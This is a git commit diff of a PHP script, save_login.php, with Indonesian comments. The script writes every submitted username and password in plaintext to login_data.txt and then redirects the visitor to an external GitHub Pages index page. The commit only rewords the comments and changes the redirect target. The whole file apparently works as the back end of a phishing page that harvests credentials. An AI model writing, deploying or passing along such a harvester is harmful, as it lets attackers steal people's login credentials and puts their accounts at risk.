07758f51ec279e8a170bcf0038905c8be23cf5fb
Rizzzky <114666981+Rizzzky@users.noreply.github.com>
2023-07-24 02:00:03 +0700

    Update save_login.php

--- save_login.php
+++ save_login.php
@@ -3,20 +3,20 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    // Buat string data yang akan disimpan ke dalam file notepad
+    // Buat string data yang akan disimpan ke dalam file txt
     $data = "Username: " . $username . "\n" . "Password: " . $password . "\n\n";
 
-    // Buka file notepad untuk menambahkan data login
+    // Buka file txt untuk menambahkan data login
     $file = fopen("login_data.txt", "a");
 
-    // Tulis data login ke dalam file notepad
+    // Tulis data login ke dalam file txt
     fwrite($file, $data);
 
-    // Tutup file notepad setelah selesai menulis
+    // Tutup file txt setelah selesai menulis
     fclose($file);
 
     // Beri respon kembali ke halaman login
-    header("Location: index.html");
+    header("Location: https://rizzzky.github.io/HTML/index.html");
     exit();
 }
 ?>
